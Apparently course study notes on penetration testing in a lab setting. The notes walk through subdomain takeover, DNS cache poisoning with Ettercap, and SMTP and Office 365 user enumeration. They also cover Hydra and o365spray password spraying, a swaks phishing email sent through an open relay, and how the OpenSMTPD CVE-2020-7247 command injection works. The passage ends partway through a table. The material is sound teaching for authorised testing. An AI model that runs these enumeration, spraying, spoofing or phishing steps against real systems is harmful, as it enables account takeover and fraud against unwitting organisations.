Subdomain enumeration is the process of discovering all subdomains associated with a target domain — a critical step before attempting subdomain takeover because the attacker must first identify which subdomains exist and then determine which ones point to expired or unclaimed third-party resources. Subfinder is a passive subdomain discovery tool that scrapes subdomains from open-source intelligence (OSINT) sources including DNSdumpster, VirusTotal, Shodan, AlienVault, BufferOver, and many others, returning discovered subdomains without sending any queries directly to the target's DNS servers, making it stealthy and efficient. The -d inlanefreight.com flag specifies the target domain, and the -v flag enables verbose output that shows which OSINT source each subdomain was discovered from — this source attribution helps assess the reliability and age of each finding. Sublist3r is an alternative subdomain enumeration tool that combines both passive OSINT-based discovery and active brute-forcing using a pre-defined wordlist of common subdomain names, making it more comprehensive than passive-only tools. Subbrute is another alternative specifically designed for internal penetration tests or environments where the target has no internet access — it performs pure DNS brute-forcing using self-defined resolver lists, meaning the tester can specify internal DNS servers as resolvers to discover internal-only subdomains that would never appear in public OSINT sources. After subdomain enumeration, the host command is used to resolve each discovered subdomain and check its CNAME records — if a CNAME points to a non-existent resource (showing a 404 or NoSuchBucket error), that subdomain is a candidate for takeover.

Step-by-Step — Subdomain Enumeration:

Step 1 — Run Subfinder against the target domain:

./subfinder -d inlanefreight.com -v

Output reveals subdomains: www.inlanefreight.com, ns1.inlanefreight.com, ns2.inlanefreight.com, support.inlanefreight.com — each sourced from different OSINT databases.

Step 2 — Clone and run Subbrute for internal/offline brute-forcing:

git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
resolvers.txt — contains the DNS server to use for resolution (internal NS in this case)
-s ./names.txt — provides the wordlist of potential subdomain names to brute-force
-r ./resolvers.txt — specifies the custom resolver file

Step 3 — Check CNAME records for takeover candidates:

host support.inlanefreight.com
support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com

The subdomain resolves via CNAME to an AWS S3 bucket name. Visiting https://support.inlanefreight.com returns a NoSuchBucket error, confirming the S3 bucket no longer exists and the subdomain is vulnerable to takeover by creating an S3 bucket with the same name.

DNS Spoofing

DNS Spoofing, also known as DNS Cache Poisoning, is an attack that involves injecting false DNS record information into a DNS server's cache or a user's local DNS resolver, causing legitimate domain name queries to resolve to fraudulent IP addresses controlled by the attacker instead of the legitimate destination. The primary goal of DNS spoofing is to transparently redirect victims to attacker-controlled servers — for example, pointing www.bankofamerica.com to an attacker's IP where a convincing fake login page is hosted — without the victim being aware that they have been redirected. Two main attack paths exist for DNS cache poisoning: the first is a Man-in-the-Middle (MITM) attack where the attacker intercepts DNS query and response traffic between a user and a DNS server, injecting a forged response that maps the queried domain to a malicious IP address before the legitimate response arrives. The second path involves exploiting a vulnerability in the DNS server software itself, giving the attacker direct control over the DNS server's records and allowing them to modify any DNS entry to point to the attacker's infrastructure. From a local network perspective, MITM-based DNS spoofing can be performed using tools like Ettercap or Bettercap, which perform ARP poisoning to position themselves between victims and their gateway, then intercept and manipulate DNS responses in transit. A successful DNS spoofing attack causes all DNS-dependent traffic from the victim to pass through or be redirected to the attacker, affecting web browsing, email, application API calls, and any other network activity that relies on domain name resolution.

Local DNS Cache Poisoning with Ettercap

Ettercap is a comprehensive network intercepting and MITM attack tool that supports multiple attack plugins including dns_spoof, which allows the attacker to respond to DNS queries with forged answers before the legitimate DNS server's response reaches the victim. The attack configuration begins with editing the Ettercap DNS configuration file at /etc/ettercap/etter.dns, which maps domain names to attacker-controlled IP addresses — every DNS query for the specified domains will be answered with the forged IP instead of the legitimate one. The configuration entry inlanefreight.com A 192.168.225.110 maps the main domain to the attacker's IP, and *.inlanefreight.com A 192.168.225.110 uses a wildcard to also intercept all subdomain queries for the same organization, ensuring comprehensive coverage. After configuring the DNS spoofing rules, Ettercap performs an ARP-based MITM attack to position itself between the victim (Target1) and the default gateway (Target2), causing all network traffic from the victim to pass through the attacker's machine first before being forwarded. The dns_spoof plugin is then activated through Plugins > Manage Plugins, which causes Ettercap to intercept DNS query packets and respond with the forged IP addresses defined in etter.dns before the legitimate DNS response can reach the victim. The success of the attack is verified by having the victim browse to inlanefreight.com and land on the attacker's fake page, and by pinging the domain from the victim and seeing it resolve to 192.168.225.110 instead of the legitimate server IP.

Step-by-Step — DNS Cache Poisoning with Ettercap:

Step 1 — Edit the Ettercap DNS spoofing configuration file:

cat /etc/ettercap/etter.dns

Add the following entries:

inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110

This maps all DNS queries for inlanefreight.com and any subdomain to the attacker's IP 192.168.225.110.

Step 2 — Launch Ettercap and scan for live hosts:
Open Ettercap and navigate to Hosts > Scan for Hosts. Ettercap sends ARP probes across the network to discover all active hosts and their MAC addresses.

Step 3 — Set targets for ARP poisoning:
Add the victim host (192.168.152.129) to Target 1 and the default gateway (192.168.152.2) to Target 2. Ettercap will now ARP-poison both devices to position the attacker as the MITM.

Step 4 — Activate the dns_spoof plugin:
Navigate to Plugins > Manage Plugins and double-click dns_spoof to activate it. Ettercap will now intercept all DNS queries from the victim and respond with the forged IP addresses from etter.dns.

Step 5 — Verify the attack:
On the victim machine (192.168.152.129), browsing to inlanefreight.com loads the attacker's fake page at 192.168.225.110. Pinging the domain also confirms redirection:

C:\>ping inlanefreight.com
Pinging inlanefreight.com [192.168.225.110] with 32 bytes of data:
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64

The victim's traffic is successfully redirected to the attacker's machine for every DNS query matching the configured domains.

Latest DNS Vulnerabilities

The most significant and impactful modern DNS vulnerability category is Subdomain Takeover, which has been identified at massive scale across the internet — a 2020 study by RedHuntLabs examining 220 million domains found over 424,000 subdomains potentially vulnerable to subdomain takeover, with 62% of those vulnerabilities belonging to the e-commerce sector. Bug bounty platforms like HackerOne explicitly list Subdomain Takeover as a valid and rewarded vulnerability category, with significant payouts for successful demonstrations, which has driven widespread tooling, research, and reporting of these vulnerabilities across all industries and company sizes. The vulnerability typically arises because companies use third-party cloud services (AWS S3, GitHub Pages, Azure, Heroku, Fastly, Akamai) to host content, create CNAME records pointing subdomains to those services, and then later delete the service accounts or resources without removing the corresponding DNS CNAME records. Even large, well-resourced companies are repeatedly affected by this vulnerability class because the organizational process gap — where the team that removes a service account is different from the team managing DNS — is extremely common and difficult to address through technical controls alone. The danger of subdomain takeover extends far beyond simple content hosting — an attacker who controls a legitimate company subdomain can abuse it for phishing campaigns, cookie theft, cross-site request forgery (CSRF), CORS policy abuse, Content Security Policy (CSP) bypass, and undermining the entire security model of the parent domain. 33 distinct third-party services have been identified as prone to this vulnerability, and the attack surface continues to grow as organizations increasingly adopt cloud services and CDNs for their infrastructure.

The Concept of the Attack

The subdomain takeover attack exploits the gap between a company's DNS records and the actual existence of the resources those records point to, allowing an attacker to claim the pointed-to resource and thereby gain control over the company's subdomain. The attack begins when the attacker discovers — through subdomain enumeration tools like Subfinder or Subbrute — a CNAME record in the company's DNS that points to a third-party service domain (e.g., inlanefreight.s3.amazonaws.com) but visiting that subdomain returns a NoSuchBucket, 404 Not Found, or There is no app here error, confirming the resource no longer exists. The attacker then registers or creates that resource with the same third-party provider — for example, creating an AWS S3 bucket named inlanefreight — and because the company's DNS CNAME record still points to that resource name, the company's subdomain immediately begins serving content from the attacker's newly created resource. The most dangerous consequence of this is that a phishing page hosted on the attacker's controlled subdomain (e.g., customer-drive.inlanefreight.com) will appear to visitors as a legitimate part of the official inlanefreight.com domain — the company name is in the URL, the connection may even show as HTTPS with a valid certificate, and there is no obvious indicator to a non-technical user that anything is wrong. The attack cycle runs in two phases: first Initiation (registering the subdomain at the third-party provider) and then Triggering the Forwarding (where real visitor traffic is automatically redirected to the attacker's content by the company's own unmodified DNS records).

Initiation of Subdomain Takeover

The initiation phase of a subdomain takeover attack involves identifying the unclaimed subdomain through DNS reconnaissance, confirming it is vulnerable by checking for error responses from the pointed-to service, and then registering or creating the resource at the third-party provider to claim control of the subdomain. The source of the attack is the company's own abandoned subdomain name — one that the company no longer actively uses or monitors but which still has a live CNAME record in their DNS zone pointing to a third-party provider where the resource has been removed. The process of claiming the subdomain involves the attacker going to the third-party provider (AWS, GitHub, Azure, etc.) and creating a new account, bucket, page, or app with the exact same name as the one referenced in the CNAME record — this is the key action that links the company's DNS record to the attacker's resource. The privileges in this phase belong to the primary domain owner — only they can modify the DNS records — but the critical point is that the third-party provider does not coordinate with the primary domain owner to prevent anyone from claiming the referenced resource name once the original owner abandons it. The destination of the initiation phase is the attacker's own server or service account at the third-party provider, which now owns the resource name that the company's subdomain CNAME points to, making the attacker the de facto owner of that subdomain from a traffic-routing perspective.

Initiation Phase — Concept of Attacks Table:

Step	Subdomain Takeover Action	Category
1	The discovered abandoned subdomain name that is no longer used by the company serves as the source for the attack	Source
2	The attacker registers the same subdomain resource at the third-party provider and links it to their own content or server	Process
3	Privileges lie with the primary domain owner who controls DNS — but the third-party provider does not restrict who can claim the resource name	Privileges
4	The attacker's server or service account at the third-party provider becomes the destination that now owns the claimed resource	Destination
Trigger the Forwarding

The forwarding trigger phase is when the subdomain takeover becomes active and impactful — real visitors attempting to access the company's subdomain are automatically redirected to the attacker's content by the company's own DNS infrastructure, without any further action needed from the attacker. The source in this phase is the visitor's browser, which requests the abandoned subdomain URL — the visitor may have arrived via a legitimate-looking link in a phishing email, a search engine result, a cached bookmark, or an internal company document that still references the old subdomain. The company's DNS server processes the query, finds the CNAME record still present in its zone file, and redirects the visitor to the third-party domain that the CNAME points to — but since the attacker now controls that resource, the visitor is served the attacker's content instead of any legitimate company resource. The privileges in this phase are with the DNS administrators who manage the parent domain — but since they have not removed the stale CNAME record, the DNS server considers the subdomain entry valid and trustworthy, forwarding requests to it as if it were a legitimate company resource. The destination is the visitor themselves — their browser renders the attacker's malicious page (phishing form, cookie harvester, malware download, etc.) while the URL bar shows the legitimate-looking company subdomain, maximizing the likelihood that the victim trusts and interacts with the content. Beyond phishing, the capabilities enabled by subdomain takeover include: stealing session cookies scoped to the parent domain, bypassing CORS policies, defeating CSP through the trusted subdomain, performing CSRF attacks, and earning significant bug bounty payouts when reported responsibly to affected organizations.

Forwarding Trigger Phase — Concept of Attacks Table:

Step	Subdomain Takeover Action	Category
5	The visitor's browser request for the abandoned subdomain URL, using the outdated CNAME record still present in company DNS, serves as the source	Source
6	The DNS server looks up the subdomain, finds the CNAME record, and redirects the visitor to the third-party domain now controlled by the attacker	Process
7	The DNS administrators who control the parent domain have not removed the stale CNAME, so the server treats the subdomain as trustworthy and forwards traffic	Privileges
8	The visitor receives the attacker's malicious content in their browser, believing they are on a legitimate company page, serving as the destination	Destination
Attacking Email Services — Detailed Notes
Attacking Email Services

A mail server (sometimes also called an email server) is a server that handles sending, receiving, and delivering email messages over a network, typically the internet, acting as the postal infrastructure for all electronic mail communications within and between organizations. When a user presses the Send button in their email client (such as Outlook, Thunderbird, or Gmail), the client establishes a TCP connection to an SMTP (Simple Mail Transfer Protocol) server, which is responsible for relaying the email from the sender's server to the recipient's server across the internet. When users download their email, their client connects to either a POP3 (Post Office Protocol version 3) or IMAP4 (Internet Message Access Protocol version 4) server — POP3 downloads and removes messages from the server to the local device, while IMAP4 synchronizes messages between the server and multiple devices without removing them from the server. This distinction between POP3 and IMAP4 is important for attackers because IMAP4 means emails remain on the server and may be accessible through server-side attacks, while POP3 may mean messages were already downloaded and are no longer accessible on the server. Attacking email services is particularly valuable in penetration tests because email accounts often contain sensitive credentials, internal communications, password reset links, business-critical documents, and other high-value data that can dramatically advance an engagement. The attack surface of email services is broad and encompasses multiple protocols and ports — SMTP (25, 465, 587), POP3 (110, 995), and IMAP4 (143, 993) — each of which presents distinct enumeration and exploitation opportunities that a thorough tester must understand and methodically probe.

Enumeration

Email server enumeration is a multi-faceted process that involves identifying the email infrastructure of a target through DNS record analysis, port scanning, service version detection, and protocol-level interaction to map out the complete attack surface. The starting point for email server enumeration is the MX (Mail eXchanger) DNS record, which specifies which mail servers are responsible for receiving email on behalf of a domain — querying MX records immediately reveals whether the organization is using a cloud email provider (Microsoft 365, G-Suite, Zoho) or running their own custom mail server. Tools like host and dig can be used to query MX records from the command line, while online tools like MXToolbox provide a graphical interface for the same queries along with additional diagnostics about email server health and configuration. The cloud provider revealed by MX records is critical intelligence because it determines the attack approach — cloud providers like Microsoft 365 and G-Suite have their own authentication systems, enumeration tools (O365Spray, CredKing), and unique vulnerabilities that differ entirely from the attacks applicable to self-hosted mail server software like Postfix or Sendmail. For custom self-hosted mail servers, Nmap with the -sC and -sV flags targeting all email-related ports simultaneously provides version information and runs email-specific scripts that can reveal open relay configurations, authentication mechanisms supported, and other immediately actionable findings. The combination of MX record analysis and Nmap scanning provides a complete picture of the email infrastructure — cloud vs. self-hosted, software versions, supported protocols, open ports, and potential misconfigurations — all needed before any exploitation attempts begin.

Email Port Reference Table:

Port	Service
TCP/25	SMTP Unencrypted
TCP/143	IMAP4 Unencrypted
TCP/110	POP3 Unencrypted
TCP/465	SMTP Encrypted
TCP/587	SMTP Encrypted/STARTTLS
TCP/993	IMAP4 Encrypted
TCP/995	POP3 Encrypted

Step-by-Step — Email Server Enumeration:

Step 1 — Query MX records with the host command:

host -t MX hackthebox.eu
hackthebox.eu mail is handled by 1 aspmx.l.google.com.

The aspmx.l.google.com MX record identifies that HackTheBox uses G-Suite (Google Workspace) for email hosting, meaning cloud-specific attack tools and Google's authentication system are relevant here.

host -t MX microsoft.com
microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.

The mail.protection.outlook.com suffix identifies Microsoft 365 as the email provider.

Step 2 — Query MX records with dig and filter output:

dig mx inlanefreight.com | grep "MX" | grep -v ";"
inlanefreight.com.   300   IN   MX   10 mail1.inlanefreight.com.

The MX record points to mail1.inlanefreight.com, a custom hostname suggesting a self-hosted mail server rather than a cloud provider, which opens the door to traditional protocol-level attacks.

Step 3 — Resolve the mail server hostname to an IP:

host -t A mail1.inlanefreight.htb.
mail1.inlanefreight.htb has address 10.129.14.128

The A record reveals the internal IP address of the custom mail server, which is now the target for port scanning.

Step 4 — Nmap scan against all email-related ports:

sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

Output reveals which ports are open, the SMTP software (e.g., Postfix smtpd), and the supported SMTP commands (e.g., VRFY, EXPN, PIPELINING, AUTH) — all of which directly inform which attacks are applicable.

Misconfigurations

Email service misconfigurations are among the most exploitable weaknesses in organizational security because email infrastructure is complex, often managed by different teams, and frequently inherits insecure default settings from legacy configurations. A fundamental misconfiguration category in SMTP is the exposure of user enumeration commands — specifically VRFY, EXPN, and RCPT TO — which are SMTP protocol commands that were originally included for legitimate administrative purposes but are frequently left enabled on production servers where they should be disabled. These commands allow any unauthenticated client connecting to TCP port 25 to verify whether specific email addresses or usernames exist on the server, effectively providing a free and effortless username enumeration service to any attacker who knows to ask. Another significant misconfiguration category is anonymous authentication — some SMTP servers are configured to allow unauthenticated clients to send email, a configuration known as an "open relay" that enables phishing, spam, and email spoofing attacks abusing the organization's own trusted mail infrastructure. The smtp-user-enum tool automates the user enumeration process by systematically testing a wordlist of usernames against any of the three enumeration commands (VRFY, EXPN, or RCPT TO), making it possible to quickly identify all valid email accounts on a server without manual interaction. Valid email accounts discovered through enumeration are then targeted for password spraying, brute-force attacks, or phishing campaigns, making user enumeration the essential first step that unlocks all subsequent email-based attacks.

Authentication — VRFY, EXPN, RCPT TO, USER Commands

The SMTP and POP3 protocols include several commands that were designed for legitimate purposes but can be abused for user enumeration when left enabled on improperly configured servers, each operating slightly differently but all achieving the same goal of confirming whether a user account exists. The VRFY command instructs the SMTP server to validate whether a given email username exists in its local database — the server responds with 252 (user exists, but delivery not guaranteed) or 550 (user does not exist), making it trivial to distinguish valid from invalid accounts through the numeric response code. The EXPN command is more dangerous than VRFY because when used with a distribution list or alias name (like "all" or "support-team"), it expands the alias and reveals all individual email addresses that are members of that list — potentially exposing the entire company's email directory in a single command. The RCPT TO command is normally used during the process of composing an SMTP message to specify the recipient — but by sending RCPT TO commands for various usernames without completing the email (without following through with DATA), an attacker can determine which recipients the server accepts (valid users) versus which ones it rejects (invalid users). The USER command in the POP3 protocol serves a similar enumeration function — when a POP3 server is sent USER <username>, it responds with +OK if the user exists or -ERR if the user does not, enabling systematic enumeration without requiring a password. The smtp-user-enum tool automates all three SMTP enumeration modes by accepting a username wordlist and running each username through the chosen command, outputting only the usernames that the server confirms exist, ready for use in subsequent password attacks.

Step-by-Step — Manual User Enumeration via Telnet:

Step 1 — Connect to the SMTP server on port 25:

telnet 10.10.110.20 25
220 parrot ESMTP Postfix (Debian/GNU)

The 220 response confirms the server is ready to receive commands. The banner reveals the OS (Debian/GNU) and MTA (Postfix).

Step 2 — Test the VRFY command:

VRFY root
252 2.0.0 root

VRFY www-data
252 2.0.0 www-data

VRFY new-user
550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table

252 means the user exists; 550 means the user does not exist. This confirms root and www-data are valid accounts on this server.

Step 3 — Test the EXPN command:

telnet 10.10.110.20 25
EXPN john
250 2.1.0 john@inlanefreight.htb

EXPN support-team
250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb

EXPN expands the support-team alias and reveals all member email addresses — carol and elisa — in a single command, far more efficient than testing individually.

Step 4 — Test the RCPT TO command:

telnet 10.10.110.20 25
MAIL FROM:test@htb.com
250 2.1.0 test@htb.com... Sender ok

RCPT TO:julio
550 5.1.1 julio... User unknown

RCPT TO:john
250 2.1.5 john... Recipient ok

julio does not exist (550); john exists (250). The RCPT TO method works even when VRFY and EXPN are disabled because the server must reveal recipient validity to complete the email delivery process.

Step 5 — Test the POP3 USER command:

telnet 10.10.110.20 110
+OK POP3 Server ready

USER julio
-ERR

USER john
+OK

The POP3 USER command confirms john exists (+OK) and julio does not (-ERR), providing a second independent enumeration channel separate from SMTP.

Step 6 — Automate enumeration with smtp-user-enum:

smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
-M RCPT — uses the RCPT TO method for enumeration
-U userlist.txt — provides the wordlist of usernames to test
-D inlanefreight.htb — appends the domain to form full email addresses (e.g., jose@inlanefreight.htb)
-t 10.129.203.7 — specifies the target SMTP server

Output:

10.129.203.7: jose@inlanefreight.htb exists
10.129.203.7: pedro@inlanefreight.htb exists
10.129.203.7: kate@inlanefreight.htb exists
3 results. 78 queries in 11 seconds (7.1 queries / sec)
Cloud Enumeration

Cloud email services such as Microsoft Office 365 and Google Workspace have replaced on-premises mail servers for a large proportion of organizations, fundamentally changing the attack surface and requiring cloud-specific enumeration and attack tools that understand the unique APIs and authentication mechanisms of each provider. O365Spray is a specialized username enumeration and password spraying tool developed specifically for Microsoft Office 365 environments, reimplementing multiple enumeration and spray techniques that leverage undocumented or semi-documented Microsoft authentication APIs to determine whether email addresses exist in a given O365 tenant. The first step when targeting a suspected O365 organization is to validate that the domain is actually using Office 365 — o365spray.py --validate --domain msplaintext.xyz sends a probe to Microsoft's authentication infrastructure and returns [VALID] The following domain is using O365 if the domain is an active O365 tenant. After validation, the --enum mode is used with a username file to test each username against the O365 tenant — valid users receive a different error response from Microsoft's authentication server than invalid users, enabling silent enumeration without triggering account lockouts or generating obvious authentication logs. The enumeration results — all valid email addresses confirmed in the O365 tenant — are automatically saved to a file for use in subsequent password spraying attacks, creating an efficient pipeline from discovery through credential testing. Cloud enumeration is particularly valuable because discovered valid accounts can then be targeted not just through SMTP but also through web-based O365 portals (OWA, Teams, SharePoint, OneDrive) and Microsoft Graph API endpoints, dramatically expanding the attack surface beyond traditional email protocol attacks.

Step-by-Step — O365 Enumeration:

Step 1 — Validate that the target domain uses Office 365:

python3 o365spray.py --validate --domain msplaintext.xyz
[VALID] The following domain is using O365: msplaintext.xyz

Confirms O365 is in use — proceed with O365-specific enumeration.

Step 2 — Enumerate valid usernames against the O365 tenant:

python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
--enum — activates username enumeration mode
-U users.txt — provides the file containing usernames to test
--domain msplaintext.xyz — specifies the O365 tenant domain

Output:

[VALID] lewen@msplaintext.xyz
[VALID] juurena@msplaintext.xyz
Valid Accounts: 2
[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'

Two valid O365 accounts were confirmed. These are now ready for password spraying.

Password Attacks

Password attacks against email services involve systematically testing discovered valid usernames against one or more passwords to gain authenticated access to email accounts, using either brute-forcing (many passwords per user) or password spraying (one password across many users) depending on the lockout policy in place. Hydra is a versatile parallel login tool that supports POP3, IMAP4, and SMTP as target protocols, making it applicable for password attacks against any type of mail server regardless of whether it is self-hosted or partially cloud-accessible. The Hydra command hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3 uses -L (uppercase) for a usernames file, -p (lowercase) for a single spray password, -f to stop at the first successful find, and pop3 to specify the service module — this is a password spray testing one password across all users in the list. For cloud services like O365, standard tools like Hydra are typically blocked by Microsoft's authentication systems, rate-limiting, or conditional access policies — specialized tools like O365Spray (for Microsoft), MailSniper (for Microsoft), and CredKing (for Google/Okta) are built specifically to handle the unique authentication flows and anti-automation measures of each cloud provider. The o365spray --spray mode includes crucial features like --count (number of passwords per spray round), --lockout (minutes to wait between rounds to avoid triggering lockout policies), and --safe (stop if a specified number of accounts become locked), making it safer to use in production environments during authorized engagements. Valid credentials discovered through password attacks unlock full access to the victim's email inbox — all historical messages, sent items, contacts, calendars, and attached documents — as well as the ability to send email as that user, which enables highly credible internal phishing, business email compromise (BEC), and lateral movement through password reset emails to other accounts.

Step-by-Step — Password Spraying:

Step 1 — Hydra password spray against POP3:

hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

Output:

[110][pop3] host: 10.129.42.197   login: john   password: Company01!
1 of 1 target successfully completed, 1 valid password found

Step 2 — O365Spray password spray against Office 365:

python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
--spray — activates password spraying mode
-U usersfound.txt — uses the valid usernames found during the enumeration phase
-p 'March2022!' — the single password to spray across all users
--count 1 — sprays one password per round before waiting
--lockout 1 — waits 1 minute between spray rounds to avoid account lockout

Output:

[VALID] lewen@msplaintext.xyz:March2022!
Valid Credentials: 1
Protocol Specifics Attacks — Open Relay

An open relay is an SMTP server that is improperly configured to accept and forward email from any source address to any destination address without requiring authentication, effectively acting as a free anonymous mail forwarding service that any attacker can abuse. From an attacker's perspective, an open relay is a powerful phishing and email spoofing tool because it allows the sending of email appearing to originate from any legitimate address — including addresses belonging to the target organization itself — without needing to compromise any actual email accounts. A realistic attack scenario is discovering that a company's internal notification system sends automated emails from a known address (e.g., notifications@inlanefreight.com) and then using the open relay to send convincing phishing emails from that exact address with a malicious link, knowing that employees trust communications appearing to come from that familiar internal sender. The Nmap smtp-open-relay script tests whether an SMTP server allows open relay by attempting 16 different relay test combinations and reporting how many succeed — a server that passes all 16 tests (14/16 tests in the example) is a fully functional open relay that can be immediately abused. Once an open relay is confirmed, the SWAKS (Swiss Army Knife for SMTP) tool provides a powerful command-line interface for composing and sending fully crafted email messages through the open relay, with control over every field including From, To, Subject, Body, and headers. A convincing phishing email sent through an open relay is particularly effective because it may bypass spam filters that whitelist the organization's own mail servers, and recipients are far more likely to click links in an email that appears to come from a known internal address.

Step-by-Step — Open Relay Abuse:

Step 1 — Test for open relay with Nmap:

nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)

14 out of 16 relay tests succeeded, confirming the server is a functional open relay ready to be used for sending spoofed email.

Step 2 — Send a phishing email through the open relay using SWAKS:

swaks --from notifications@inlanefreight.com \
      --to employees@inlanefreight.com \
      --header 'Subject: Company Notification' \
      --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' \
      --server 10.10.11.213
--from notifications@inlanefreight.com — spoofs the sender as the company's legitimate notification address
--to employees@inlanefreight.com — targets the company-wide employee distribution list
--header 'Subject: Company Notification' — sets a convincing internal-sounding subject line
--body — the email body containing the phishing link
--server 10.10.11.213 — specifies the open relay to send through

Output confirms successful delivery:

-> MAIL FROM:<notifications@inlanefreight.com>
<-  250 OK
-> RCPT TO:<employees@inlanefreight.com>
<-  250 OK
-> DATA
<-  354 End data with <CR><LF>.<CR><LF>
...message body...
<-  250 OK
-> QUIT
<-  221 Bye

The email was accepted and queued by the open relay server for delivery to all employees, appearing to originate from the legitimate company notification address.

Latest Email Service Vulnerabilities

One of the most critical and impactful recently disclosed SMTP vulnerabilities was discovered in OpenSMTPD up to version 6.6.2, assigned CVE-2020-7247, which allows an unauthenticated remote attacker to execute arbitrary operating system commands on the server simply by sending a crafted email message — a pre-authentication Remote Code Execution (RCE) vulnerability that has been exploitable since 2018 though it was not publicly disclosed until 2020. OpenSMTPD is the default SMTP daemon on OpenBSD but has been widely deployed across Debian, Fedora, FreeBSD, and other Linux distributions, meaning this vulnerability had a broad impact across many different operating system environments and deployment types at the time of disclosure. According to Shodan.io data from April 2022, over 5,000 publicly accessible OpenSMTPD servers were reachable on the internet, with a growing trend, and the number has continued to increase — demonstrating that the vulnerability affects a significant and growing number of real-world deployments even years after the CVE disclosure. The particularly dangerous characteristic of CVE-2020-7247 is that it requires no authentication whatsoever — the attacker does not need to know any credentials, have any prior access to the system, or perform any prior reconnaissance beyond confirming that OpenSMTPD is running — any internet-connected system running the vulnerable version is immediately exploitable by anyone who finds it. The vulnerability lies in the function that processes and records the sender's email address in the MAIL FROM SMTP command — by injecting a semicolon (;) followed by arbitrary shell commands within the sender address field, an attacker can cause the OpenSMTPD process to execute those commands as part of its normal email processing workflow. The command injection is limited to 64 characters, which requires creative payload crafting to achieve useful results within the constraint — but common techniques like using a short payload to download and execute a longer remote script easily bypass this limitation.

The Concept of the Attack

The OpenSMTPD CVE-2020-7247 attack exploits a command injection vulnerability in the email sender address parsing function, where insufficient input validation allows a specially crafted sender address containing a semicolon character to break out of the address recording function and cause the SMTP process to execute arbitrary operating system commands. The attack begins by establishing a standard SMTP connection to port 25 of the target OpenSMTPD server — this can be done manually using telnet or netcat, or automated through a purpose-built exploit script that handles the SMTP conversation automatically. After the connection is established, the attacker composes an SMTP email message using the standard MAIL FROM, RCPT TO, and DATA commands — but the critical modification is in the MAIL FROM field, where instead of a normal email address, the attacker inserts a malformed value like ; system_command ; that uses the semicolon as a command separator to inject shell commands. The OpenSMTPD process reads the sender field, encounters the semicolon, and due to the vulnerable code path in the source, interprets everything after the semicolon as a separate shell command to execute rather than continuing to process it as part of the email address string. Because OpenSMTPD listens on port 25 (a privileged port below 1024) and privileged ports require root access on Linux/Unix systems, the OpenSMTPD daemon runs with root-level privileges, meaning the injected shell commands execute as root — providing the attacker with full administrative control over the target system. The attack cycle is divided into two phases: the Initiation phase where the SMTP connection is established and the crafted email is composed, and the RCE Trigger phase where the vulnerable code path executes the injected command and the results are returned to the attacker.

Initiation of the Attack

The initiation phase of the CVE-2020-7247 exploit involves establishing the SMTP connection, navigating the standard SMTP protocol handshake, and crafting the malicious MAIL FROM command that embeds the shell command injection payload within the sender's email address field. The source of the attack is the user input — either entered manually through a terminal connection or automated through a script — that directly interacts with the OpenSMTPD service over TCP port 25 without any requirement for prior authentication or account credentials of any kind. The service receives the crafted SMTP session and processes it according to standard SMTP protocol rules, reading the MAIL FROM address, the RCPT TO recipient, and preparing to accept the message body — each of these steps is standard and expected by the server, hiding the malicious nature of the session until the vulnerable parsing function is invoked. OpenSMTPD listens on port 25, a privileged port below 1024, which under Linux and Unix operating systems requires the service to be launched with root privileges — this architectural requirement means the service and all processes it spawns run with full system administrator rights on the host. The crafted information from the sender field is processed locally and then forwarded to another internal process for delivery handling, which is the point where the injected command will be extracted and executed. The destination of the initiation phase is this second internal OpenSMTPD process — the delivery handler — which receives the crafted sender field content and contains the vulnerable code that will interpret the semicolon-delimited injection as a system command.

Initiation Phase — Concept of Attacks Table:

Step	Remote Code Execution Action	Category
1	The attacker manually or automatically inputs the crafted SMTP session with the malicious MAIL FROM field as the source	Source
2	OpenSMTPD takes the email with all required fields (MAIL FROM, RCPT TO) and processes it as a standard incoming message	Process
3	Port 25 is a privileged port requiring root to bind — OpenSMTPD therefore runs with root/elevated privileges throughout	Privileges
4	The crafted email data is forwarded to another internal OpenSMTPD process responsible for local mail delivery	Destination
Trigger Remote Code Execution

The RCE trigger phase is where the malicious payload embedded in the sender address field is actually parsed by the vulnerable OpenSMTPD delivery code, the semicolon triggers command separation, and the injected shell command is executed by the operating system with root-level privileges, completing the exploit chain. The source in this phase is specifically the content of the MAIL FROM sender field that was crafted during the initiation phase — the entire string including both the partial email address prefix and the semicolon-delimited command injection payload is passed to the delivery handler for processing. The delivery handler process reads the sender address field character by character and encounters the semicolon character — due to a flaw in how the source code handles special characters in this context, the semicolon is interpreted as a command separator rather than being sanitized or rejected, causing the remainder of the string to be executed as a shell command rather than processed as part of the email address. The elevated privileges from the initiation phase carry through into the delivery process — since all OpenSMTPD child processes inherit the root privileges of the parent daemon, the shell command injection also executes with root privileges on the target system, bypassing any user permission boundaries that would otherwise restrict what actions the command can take. The destination of the RCE trigger is the network — the most common exploit payload is a reverse shell command (within the 64-character limit) that opens a TCP connection from the target back to the attacker's machine, dropping the attacker into an interactive root shell on the target system. An exploit demonstrating this vulnerability in full detail is available on the Exploit-DB platform, providing both the proof-of-concept code and technical analysis of the exact vulnerable code paths for deeper study and understanding.

RCE Trigger Phase — Concept of Attacks Table:

Step	Remote Code Execution Action	Category
5	The malicious sender field content — the entire MAIL FROM string including the semicolon and injected command — serves as the source for the RCE trigger	Source
6	The delivery handler reads the sender field, the semicolon interrupts address parsing per the vulnerable source code logic, and the remainder is passed to the shell for execution	Process
